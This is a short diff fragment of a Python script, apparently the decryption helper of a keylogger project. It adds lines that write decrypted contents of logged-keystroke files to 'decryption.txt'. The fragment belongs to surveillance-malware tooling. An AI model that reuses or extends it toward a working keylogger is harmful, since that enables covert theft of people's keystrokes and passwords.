@@ -8,3 +8,7 @@ keys_information_e = 'e_keys_logged.txt'
 for decrypting_files in encrypted_files:
     with open(encrypted_files[count], 'rb') as f:
         data = f.read()
+
+    with open("decryption.txt", 'ab') as f:
+        f.write(decrypted)
+    count += 1
